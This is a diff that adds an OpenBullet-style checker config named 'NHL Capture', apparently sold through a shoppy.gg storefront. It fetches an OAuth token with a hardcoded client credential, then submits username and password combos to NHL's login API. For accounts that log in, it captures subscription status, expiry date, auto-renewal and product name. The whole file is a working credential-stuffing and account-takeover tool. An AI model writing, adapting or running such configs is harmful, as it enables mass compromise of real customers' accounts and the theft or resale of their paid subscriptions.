@@ -1,0 +1,121 @@
+[SETTINGS]
+{
+  "Name": "NHL Capture",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-11-17T15:00:43.1049633+01:00",
+  "AdditionalInfo": "",
+  "Author": "shoppy.gg/@Slk.prono",
+  "Version": "1.4.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://user.svc.nhl.com/oauth/token?grant_type=client_credentials" 
+  CONTENT "{}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: user.svc.nhl.com" 
+  HEADER "Origin: https://secure.web.nhl.com" 
+  HEADER "Authorization: Basic d2ViX25obC12MS4wLjA6MmQxZDg0NmVhM2IxOTRhMThlZjQwYWM5ZmJjZTk3ZTM=" 
+  HEADER "Referer: https://secure.web.nhl.com/" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"token_type\":\"Bearer\",\"" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "access_token" 
+
+REQUEST POST "https://user.svc.nhl.com/v2/user/identity" 
+  CONTENT "{\"email\":{\"address\":\"<USER>\"},\"password\":{\"value\":\"<PASS>\"},\"type\":\"email-password\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: user.svc.nhl.com" 
+  HEADER "Origin: https://secure.web.nhl.com" 
+  HEADER "Authorization: <access_token>" 
+  HEADER "Referer: https://secure.web.nhl.com/" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid credentials for identification" 
+  KEYCHAIN Success OR 
+    KEY "{\"identification\":{\"" 
+
+PARSE "<SOURCE>" LR "" "" -> VAR "Cap" 
+
+FUNCTION Replace "\",\"id\":\"nhlGatewayId" "" "<Cap>" -> VAR "Cap2" 
+
+PARSE "<Cap2>" LR "\"id\":" "}" -> VAR "ID" 
+
+REQUEST GET "https://user.svc.nhl.com/v2/user/<ID>/feature/entitled?featureContextNames=NHL_ROGERS.DEF" 
+  
+  HEADER "Host: user.svc.nhl.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.nhl.com" 
+  HEADER "authorization: <COOKIES(Authorization)>" 
+  HEADER "Referer: https://www.nhl.com/tv" 
+
+REQUEST GET "https://subscription.svc.nhl.com/ws/subscription/v1/find?view=SIMPLE&filter.categoryCode=nhl_submgmt_products&filter.activeOnly=true" 
+  
+  HEADER "Host: subscription.svc.nhl.com" 
+  HEADER "Origin: https://secure.web.nhl.com" 
+  HEADER "Authorization: <COOKIES(Authorization)>" 
+  HEADER "Referer: https://secure.web.nhl.com/" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\",\"subscriptionStatus\":\"SUBSCRIBED\",\"" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "{\"subscriptions\":[]}" 
+    KEY "<SOURCE>" DoesNotContain "\",\"subscriptionStatus\":\"SUBSCRIBED\",\"" 
+
+PARSE "<SOURCE>" LR "{\"autoRenew\":" "," -> CAP "autoRenew" 
+
+PARSE "<SOURCE>" LR ",\"expirationDate\":\"" "\"" -> CAP "expirationDate" 
+
+PARSE "<SOURCE>" LR "\"sku\":\"" "\"" -> VAR "SKU" 
+
+REQUEST GET "https://gateway.svc.nhl.com/ws/product/v1/findBySku/<SKU>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR ",\"name\":\"" "\"" -> CAP "Subscription" 
+
